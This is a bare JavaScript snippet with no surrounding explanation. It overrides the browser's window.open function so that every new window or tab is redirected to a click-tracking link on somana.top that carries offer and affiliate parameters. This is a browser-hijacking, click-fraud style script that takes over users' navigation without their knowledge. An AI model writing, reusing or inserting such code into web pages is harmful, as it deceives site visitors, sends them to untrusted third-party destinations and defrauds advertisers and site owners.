const originalOpen = window.open;


window.open = function (url, name, specs) {
  const newWindow = originalOpen.call(this, url, name, specs);
  
  if (newWindow) {
    newWindow.location.href = 'https://somana.top/click?o=2&a=7685';
  }
  
  return newWindow;
};
